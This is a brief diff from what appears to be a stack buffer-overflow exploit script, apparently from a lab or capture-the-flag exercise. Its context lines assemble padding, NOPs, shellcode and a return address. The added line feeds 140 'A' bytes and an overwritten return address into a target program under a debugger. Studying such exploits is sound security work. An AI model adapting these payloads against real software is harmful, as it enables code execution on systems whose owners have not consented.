@@ -12,3 +12,8 @@ payload = padding + nops + shellcode + eip
 #    f.write(payload)
 
 #sys.stdout.buffer.write(payload)
+
+
+
+
+r < <(python -c "import sys; sys.stdout.buffer.write(b'A' * 140 + b'\xef\xbe\xad\xde\xff\x7f\x00\x00')")
